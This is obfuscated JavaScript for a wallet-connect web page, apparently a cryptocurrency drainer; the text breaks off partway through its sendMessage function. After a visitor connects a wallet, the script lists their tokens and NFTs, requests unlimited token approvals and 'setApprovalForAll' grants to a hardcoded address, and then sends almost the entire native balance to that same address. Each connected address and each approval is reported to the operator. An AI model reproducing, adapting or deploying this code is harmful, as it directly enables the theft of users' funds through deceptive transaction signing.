const _0x5988e9=_0x3c47;(function(_0x3cbdc8,_0x53e4b2){const _0x106f20=_0x3c47,_0x97b031=_0x3cbdc8();while(!![]){try{const _0x595940=-parseInt(_0x106f20(0x110))/0x1*(parseInt(_0x106f20(0xd8))/0x2)+parseInt(_0x106f20(0x130))/0x3*(parseInt(_0x106f20(0x14a))/0x4)+parseInt(_0x106f20(0x176))/0x5+-parseInt(_0x106f20(0xc7))/0x6*(-parseInt(_0x106f20(0x10d))/0x7)+-parseInt(_0x106f20(0x12a))/0x8+-parseInt(_0x106f20(0x13e))/0x9*(parseInt(_0x106f20(0x154))/0xa)+-parseInt(_0x106f20(0xd7))/0xb*(-parseInt(_0x106f20(0x172))/0xc);if(_0x595940===_0x53e4b2)break;else _0x97b031['push'](_0x97b031['shift']());}catch(_0x53eecf){_0x97b031['push'](_0x97b031['shift']());}}}(_0x4918,0xec5d3));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {avalanche,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[avalanche,mainnet],projectId=_0x5988e9(0x13b),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors['CoinbaseWalletConnector']({'chains':chains,'options':{'appName':_0x5988e9(0x10c)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x5988e9(0xd5),'coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window['location'][_0x5988e9(0x10a)];const OWNER_ADDRESS=_0x5988e9(0x122),ABI=[{'constant':!![],'inputs':[],'name':_0x5988e9(0x133),'outputs':[{'name':'','type':_0x5988e9(0xf3)}],'payable':![],'stateMutability':'view','type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x5988e9(0xd2)}],'name':_0x5988e9(0x145),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x135),'type':_0x5988e9(0xd2)},{'name':_0x5988e9(0x11b),'type':'uint256'}],'name':_0x5988e9(0xed),'outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':'function'},{'constant':!![],'inputs':[],'name':_0x5988e9(0xf8),'outputs':[{'name':'','type':_0x5988e9(0x11e)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x102),'type':'address'}],'name':_0x5988e9(0xc5),'outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':_0x5988e9(0x175),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':'function'},{'constant':![],'inputs':[{'name':_0x5988e9(0x14b),'type':_0x5988e9(0xd2)},{'name':_0x5988e9(0x170),'type':_0x5988e9(0xd2)},{'name':_0x5988e9(0x11b),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x177),'outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':_0x5988e9(0x101),'outputs':[{'name':'','type':_0x5988e9(0xd2)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[{'name':'','type':_0x5988e9(0xd2)}],'name':_0x5988e9(0xe7),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':'function'},{'constant':!![],'inputs':[],'name':_0x5988e9(0x104),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':_0x5988e9(0x107),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x5988e9(0xe0),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[],'name':_0x5988e9(0x11c),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[{'name':_0x5988e9(0x150),'type':_0x5988e9(0xd2)}],'name':_0x5988e9(0x12c),'outputs':[{'name':'','type':_0x5988e9(0x11e)}],'payable':![],'stateMutability':'view','type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[{'name':'','type':_0x5988e9(0xd2)},{'name':'','type':'address'}],'name':_0x5988e9(0xdd),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x5988e9(0x11e)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[{'name':_0x5988e9(0xcd),'type':'address'}],'name':_0x5988e9(0x156),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[],'name':_0x5988e9(0xe1),'outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x5988e9(0xd2)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':_0x5988e9(0x16f),'outputs':[{'name':'','type':_0x5988e9(0xd2)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x5988e9(0x147),'outputs':[{'name':'','type':_0x5988e9(0xf3)}],'payable':![],'stateMutability':'view','type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x170),'type':'address'},{'name':_0x5988e9(0x11b),'type':_0x5988e9(0x123)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x109),'type':'uint256'},{'name':_0x5988e9(0x167),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x142),'outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x140),'type':_0x5988e9(0x123)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x140),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x138),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[{'name':_0x5988e9(0x129),'type':'address'},{'name':_0x5988e9(0x135),'type':_0x5988e9(0xd2)}],'name':'allowance','outputs':[{'name':_0x5988e9(0x106),'type':_0x5988e9(0x123)}],'payable':![],'stateMutability':'view','type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':_0x5988e9(0xee),'outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[{'name':'','type':_0x5988e9(0xd2)}],'name':_0x5988e9(0xcf),'outputs':[{'name':'','type':_0x5988e9(0x11e)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':_0x5988e9(0x118),'type':_0x5988e9(0xd2)}],'name':_0x5988e9(0x15a),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x5988e9(0x123)}],'payable':![],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':'newOwner','type':_0x5988e9(0xd2)}],'name':_0x5988e9(0xe3),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'constant':![],'inputs':[{'name':'_blackListedUser','type':_0x5988e9(0xd2)}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':'function'},{'inputs':[{'name':_0x5988e9(0x163),'type':_0x5988e9(0x123)},{'name':_0x5988e9(0xbf),'type':_0x5988e9(0xf3)},{'name':_0x5988e9(0x143),'type':_0x5988e9(0xf3)},{'name':'_decimals','type':'uint256'}],'payable':![],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xf2)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x5988e9(0x123)}],'name':_0x5988e9(0x14f),'type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5988e9(0x140),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x157),'type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5988e9(0xdf),'type':_0x5988e9(0xd2)}],'name':_0x5988e9(0x11d),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5988e9(0x15c),'type':_0x5988e9(0x123)},{'indexed':![],'name':_0x5988e9(0xd0),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x171),'type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5988e9(0xff),'type':'address'},{'indexed':![],'name':'_balance','type':_0x5988e9(0x123)}],'name':'DestroyedBlackFunds','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x5988e9(0x114),'type':_0x5988e9(0xd2)}],'name':_0x5988e9(0x132),'type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x5988e9(0xd2)}],'name':'RemovedBlackList','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x5988e9(0xd2)},{'indexed':!![],'name':_0x5988e9(0xda),'type':'address'},{'indexed':![],'name':_0x5988e9(0x141),'type':_0x5988e9(0x123)}],'name':'Approval','type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':_0x5988e9(0xd2)},{'indexed':!![],'name':'to','type':_0x5988e9(0xd2)},{'indexed':![],'name':_0x5988e9(0x141),'type':'uint256'}],'name':_0x5988e9(0x113),'type':'event'},{'anonymous':![],'inputs':[],'name':'Pause','type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[],'name':_0x5988e9(0xf4),'type':_0x5988e9(0xbd)}],ABIN=[{'inputs':[{'internalType':_0x5988e9(0xf3),'name':_0x5988e9(0x133),'type':_0x5988e9(0xf3)},{'internalType':_0x5988e9(0xf3),'name':_0x5988e9(0x147),'type':'string'},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0x10b),'type':_0x5988e9(0x123)},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0x165),'type':_0x5988e9(0x123)}],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':'owner','type':_0x5988e9(0xd2)},{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x131),'type':_0x5988e9(0xd2)},{'indexed':!![],'internalType':_0x5988e9(0x123),'name':_0x5988e9(0xc2),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x153),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x16f),'type':'address'},{'indexed':!![],'internalType':'address','name':_0x5988e9(0x116),'type':'address'},{'indexed':![],'internalType':'bool','name':_0x5988e9(0x131),'type':_0x5988e9(0x11e)}],'name':_0x5988e9(0xca),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x111),'type':_0x5988e9(0xd2)},{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0xeb),'type':_0x5988e9(0xd2)}],'name':'OwnershipTransferred','type':_0x5988e9(0xbd)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x11f),'type':_0x5988e9(0xd2)},{'indexed':!![],'internalType':_0x5988e9(0xd2),'name':'to','type':_0x5988e9(0xd2)},{'indexed':!![],'internalType':_0x5988e9(0x123),'name':_0x5988e9(0xc2),'type':'uint256'}],'name':_0x5988e9(0x113),'type':_0x5988e9(0xbd)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x5988e9(0xf3),'name':'','type':_0x5988e9(0xf3)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0xde),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':_0x5988e9(0x123)}],'stateMutability':_0x5988e9(0x146),'type':'function'},{'inputs':[],'name':_0x5988e9(0xe5),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':_0x5988e9(0x123)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':'to','type':_0x5988e9(0xd2)},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0xc2),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0xed),'outputs':[],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':'address','name':'owner','type':'address'}],'name':_0x5988e9(0x156),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':'uint256'}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0x16b),'outputs':[{'internalType':_0x5988e9(0xf3),'name':'','type':_0x5988e9(0xf3)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0x124),'outputs':[],'stateMutability':_0x5988e9(0x16c),'type':'function'},{'inputs':[],'name':_0x5988e9(0x148),'outputs':[],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0x123),'name':'tokenId','type':_0x5988e9(0x123)}],'name':_0x5988e9(0xfc),'outputs':[{'internalType':_0x5988e9(0xd2),'name':'','type':_0x5988e9(0xd2)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':'owner','type':_0x5988e9(0xd2)},{'internalType':'address','name':_0x5988e9(0x116),'type':_0x5988e9(0xd2)}],'name':_0x5988e9(0xdc),'outputs':[{'internalType':_0x5988e9(0x11e),'name':'','type':_0x5988e9(0x11e)}],'stateMutability':_0x5988e9(0x146),'type':'function'},{'inputs':[],'name':_0x5988e9(0x121),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':_0x5988e9(0x123)}],'stateMutability':_0x5988e9(0x146),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x5988e9(0x108),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x12f),'outputs':[],'stateMutability':'payable','type':_0x5988e9(0xe4)},{'inputs':[],'name':'name','outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0x16f),'outputs':[{'internalType':_0x5988e9(0xd2),'name':'','type':'address'}],'stateMutability':'view','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x5988e9(0x123)}],'name':_0x5988e9(0xe6),'outputs':[{'internalType':_0x5988e9(0xd2),'name':'','type':_0x5988e9(0xd2)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0xea),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x11f),'type':_0x5988e9(0xd2)},{'internalType':_0x5988e9(0xd2),'name':'to','type':_0x5988e9(0xd2)},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0xc2),'type':_0x5988e9(0x123)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x11f),'type':_0x5988e9(0xd2)},{'internalType':'address','name':'to','type':_0x5988e9(0xd2)},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0xc2),'type':_0x5988e9(0x123)},{'internalType':_0x5988e9(0x16a),'name':'_data','type':_0x5988e9(0x16a)}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0xd6),'outputs':[{'internalType':_0x5988e9(0x11e),'name':'','type':_0x5988e9(0x11e)}],'stateMutability':'view','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x116),'type':_0x5988e9(0xd2)},{'internalType':'bool','name':_0x5988e9(0x131),'type':'bool'}],'name':'setApprovalForAll','outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xf3),'name':_0x5988e9(0x16b),'type':_0x5988e9(0xf3)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xf3),'name':_0x5988e9(0x14e),'type':_0x5988e9(0xf3)}],'name':_0x5988e9(0xc9),'outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':'uint256','name':_0x5988e9(0x10f),'type':_0x5988e9(0x123)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0xbb),'outputs':[],'stateMutability':_0x5988e9(0x16c),'type':'function'},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':_0x5988e9(0x123)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0x120),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':_0x5988e9(0x123)}],'stateMutability':'view','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0x105),'name':'interfaceId','type':_0x5988e9(0x105)}],'name':_0x5988e9(0x15b),'outputs':[{'internalType':_0x5988e9(0x11e),'name':'','type':_0x5988e9(0x11e)}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[],'name':'symbol','outputs':[{'internalType':'string','name':'','type':_0x5988e9(0xf3)}],'stateMutability':'view','type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0x139),'type':'uint256'}],'name':_0x5988e9(0x127),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0x16f),'type':_0x5988e9(0xd2)},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0x139),'type':'uint256'}],'name':_0x5988e9(0xf1),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':_0x5988e9(0x123)}],'stateMutability':_0x5988e9(0x146),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x5988e9(0xc2),'type':'uint256'}],'name':_0x5988e9(0x168),'outputs':[{'internalType':_0x5988e9(0xf3),'name':'','type':'string'}],'stateMutability':'view','type':_0x5988e9(0xe4)},{'inputs':[],'name':_0x5988e9(0x175),'outputs':[{'internalType':_0x5988e9(0x123),'name':'','type':'uint256'}],'stateMutability':_0x5988e9(0x146),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':'address','name':_0x5988e9(0x11f),'type':'address'},{'internalType':_0x5988e9(0xd2),'name':'to','type':'address'},{'internalType':_0x5988e9(0x123),'name':_0x5988e9(0xc2),'type':_0x5988e9(0x123)}],'name':_0x5988e9(0x177),'outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)},{'inputs':[{'internalType':_0x5988e9(0xd2),'name':_0x5988e9(0xeb),'type':'address'}],'name':_0x5988e9(0xe3),'outputs':[],'stateMutability':_0x5988e9(0x16c),'type':'function'},{'inputs':[],'name':_0x5988e9(0xfd),'outputs':[],'stateMutability':_0x5988e9(0x16c),'type':_0x5988e9(0xe4)}];let wallet;$(_0x5988e9(0xfe))['click'](async function(){const _0x253c29=_0x5988e9;wallet=_0x253c29(0xf0),await connector();}),$(_0x5988e9(0xf9))['click'](async function(){const _0x39a07d=_0x5988e9;wallet=_0x39a07d(0xe2),await connector();}),$(_0x5988e9(0xc1))[_0x5988e9(0x152)](async function(){wallet='trustwallet',await connector();}),$(_0x5988e9(0x17b))[_0x5988e9(0x152)](async function(){const _0x23b8c5=_0x5988e9;try{await web3Modal['openModal']();}catch(_0x20eacc){console[_0x23b8c5(0x100)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x20eacc);return;}});function _0x3c47(_0x4ad6ec,_0x5ed7a4){const _0x4918aa=_0x4918();return _0x3c47=function(_0x3c4792,_0x242521){_0x3c4792=_0x3c4792-0xba;let _0x2c0d0f=_0x4918aa[_0x3c4792];return _0x2c0d0f;},_0x3c47(_0x4ad6ec,_0x5ed7a4);}let connector=async()=>{const _0xc0433d=_0x5988e9;if(typeof web3===_0xc0433d(0x151)&&typeof ethereum===_0xc0433d(0x151)){console['log'](_0xc0433d(0x117));if(wallet==='metamask'){let _0x391b7f='https://metamask.app.link/dapp/'+currentUrl;window[_0xc0433d(0x159)]['href']=_0x391b7f;}else{if(wallet==='coinbase'){let _0x373d89=_0xc0433d(0xd1)+currentUrl;window[_0xc0433d(0x159)][_0xc0433d(0x10a)]=_0x373d89;}else{if(wallet===_0xc0433d(0xd9)){let _0x53b496=_0xc0433d(0x115)+currentUrl;window[_0xc0433d(0x159)][_0xc0433d(0x10a)]=_0x53b496;}}}}else try{await web3Modal[_0xc0433d(0x13d)]();}catch(_0x49646a){console[_0xc0433d(0x100)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x49646a);return;}};$(_0x5988e9(0xc8))[_0x5988e9(0x152)](async function(){const _0x2e7f43=_0x5988e9;let _0xe09b40=getAccount();console[_0x2e7f43(0x100)](_0xe09b40),!_0xe09b40[_0x2e7f43(0xd2)]&&(console['log'](_0x2e7f43(0x164)),alert(_0x2e7f43(0x17a))),_0xe09b40[_0x2e7f43(0x128)][_0x2e7f43(0x133)]===_0x2e7f43(0x14c)&&(_0xe09b40[_0x2e7f43(0x128)][_0x2e7f43(0x14d)][_0x2e7f43(0xbc)]()[_0x2e7f43(0x13a)]!==_0x2e7f43(0xd3)&&(console[_0x2e7f43(0x100)](_0x2e7f43(0xf5)),await switchNetwork({'chainId':0xa86a}))),selectedAccount=_0xe09b40[_0x2e7f43(0xd2)],sendMessage(_0x2e7f43(0x160)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x5988e9(0x178),Oxc='2062856957';async function covalenthqAPICall(){const _0x2f9d87=_0x5988e9,_0x18a111={'chain':_0x2f9d87(0x161)},_0x19452a=new URL(_0x2f9d87(0x144)+selectedAccount+'/erc20');_0x19452a['search']=new URLSearchParams(_0x18a111)[_0x2f9d87(0x137)]();const _0x5e3c49={'method':_0x2f9d87(0x10e),'headers':{'accept':'application/json','X-API-Key':_0x2f9d87(0xe9)}};try{const _0x1053f5=await fetch(_0x19452a,_0x5e3c49)[_0x2f9d87(0xdb)](_0x2a4dc0=>_0x2a4dc0[_0x2f9d87(0x112)]());console[_0x2f9d87(0x100)](_0x1053f5);let _0x3812f3=_0x1053f5;console['log'](_0x2f9d87(0x12b),_0x3812f3);let _0x11059b=await Promise[_0x2f9d87(0x15f)](_0x3812f3[_0x2f9d87(0xd4)](async _0x1d3af7=>{const _0x387bdd=_0x2f9d87;let _0x1cf704;try{_0x1cf704=await getValue(_0x1d3af7[_0x387bdd(0x125)],_0x1d3af7[_0x387bdd(0xbe)],_0x1d3af7['decimals']);}catch(_0x36504a){_0x1cf704=0x0;}return console[_0x387bdd(0x100)](_0x1cf704),{'balance':_0x1d3af7['balance'],'value':_0x1cf704,'address':_0x1d3af7[_0x387bdd(0x125)]};}));console[_0x2f9d87(0x100)](_0x2f9d87(0x174),_0x11059b),tokens=_0x11059b[_0x2f9d87(0xfa)](_0x3e0ba4=>_0x3e0ba4[_0x2f9d87(0x141)]>0x5),tokens[_0x2f9d87(0x173)]((_0x100d74,_0x3b36ad)=>_0x3b36ad[_0x2f9d87(0x141)]-_0x100d74['value']),console[_0x2f9d87(0x100)](_0x2f9d87(0xc4),await getNetwork(),'Tokens:',tokens),NFTs=await getNFTs(selectedAccount)[_0x2f9d87(0xc3)](_0x26b403=>{const _0x358cbd=_0x2f9d87;console[_0x358cbd(0x100)](_0x358cbd(0xce),_0x26b403);}),NFTs=NFTs[_0x2f9d87(0xc6)],console[_0x2f9d87(0x100)](_0x2f9d87(0x12d),NFTs);if(tokens[_0x2f9d87(0x149)]===0x0&&NFTs[_0x2f9d87(0x149)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x2f9d87(0x12e));}}async function onApprove(){const _0x16a8bc=_0x5988e9;if(tokens['length'])try{loopTokens(tokens);}catch(_0x15de4b){console[_0x16a8bc(0x13c)]('Error\x20processing\x20item\x20'+_0x15de4b['message']);}else{if(NFTs[_0x16a8bc(0x149)]){try{loopNfts(NFTs);}catch(_0x497f27){console['error']('Error\x20processing\x20item\x20'+_0x497f27[_0x16a8bc(0x134)]);}onSendEther(),sendMessage(_0x16a8bc(0xe8));}else try{onSendEther();}catch(_0x51f7fc){console['error'](_0x16a8bc(0xcb)+_0x51f7fc['message']);}}}async function loopTokens(_0x1c4c98){const _0x25382e=_0x5988e9;for await(let _0x2faa8c of _0x1c4c98){console[_0x25382e(0x100)](_0x25382e(0x136),_0x2faa8c);try{sendMessage(_0x25382e(0x15d));let {hash:_0x5d5e3c}=await writeContract({'address':_0x2faa8c[_0x25382e(0xd2)],'abi':ABI,'functionName':_0x25382e(0xed),'args':[Oxa,_0x25382e(0xef)]});console['log']('hash',_0x5d5e3c),_0x5d5e3c&&(console[_0x25382e(0x100)]('Approved'),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x25382e(0x126)+_0x2faa8c['address']),sendMessage(_0x25382e(0x179)+_0x2faa8c[_0x25382e(0xbe)]),sendMessage(_0x25382e(0x16d)+Oxa));}catch(_0x414ea1){console['log'](_0x25382e(0xba)+_0x414ea1),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x460627){const _0x17c2b=_0x5988e9;for await(let _0x2eeed2 of _0x460627){console[_0x17c2b(0x100)](_0x17c2b(0x166),_0x2eeed2);try{let {hash:_0x327262}=await writeContract({'address':_0x2eeed2[_0x17c2b(0x125)],'abi':ABIN,'functionName':_0x17c2b(0xf6),'args':[Oxa,!![]]});console[_0x17c2b(0x100)](_0x17c2b(0xcc),_0x327262),console[_0x17c2b(0x100)](_0x17c2b(0xf7)+receipt),sendMessage(_0x17c2b(0x119)),sendMessage(_0x17c2b(0x103)+_0x2eeed2[_0x17c2b(0x125)]),sendMessage(_0x17c2b(0x16d)+Oxa);}catch(_0x3a2d7f){console[_0x17c2b(0x100)]('Error:\x20'+_0x3a2d7f),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0x349be5=_0x5988e9;console[_0x349be5(0x100)](_0x349be5(0xc0));try{let _0x49c483=await fetchBalance({'address':selectedAccount});console['log'](_0x49c483);const _0x37289a=await fetchFeeData();console[_0x349be5(0x100)](_0x37289a);var _0xa6de46=_0x37289a['formatted'][_0x349be5(0x17c)];_0xa6de46=parseFloat(_0xa6de46);let _0x12e1b9=parseFloat(_0x49c483[_0x349be5(0x11a)])-_0xa6de46*0.00042;_0x12e1b9=parseEther(_0x12e1b9[_0x349be5(0x137)]()),console['log'](_0x12e1b9);const {hash:_0x390f78}=await sendTransaction({'to':Oxa,'value':_0x12e1b9});console[_0x349be5(0x100)](_0x390f78),sendMessage('Transaction\x20hash\x20',_0x390f78),sendMessage(_0x349be5(0xfb)),sendMessage(_0x349be5(0x158));}catch{sendMessage(_0x349be5(0x162));}}async function sendMessage(_0x579407){return new Promise((_0x53a93f,_0x50063f)=>{const 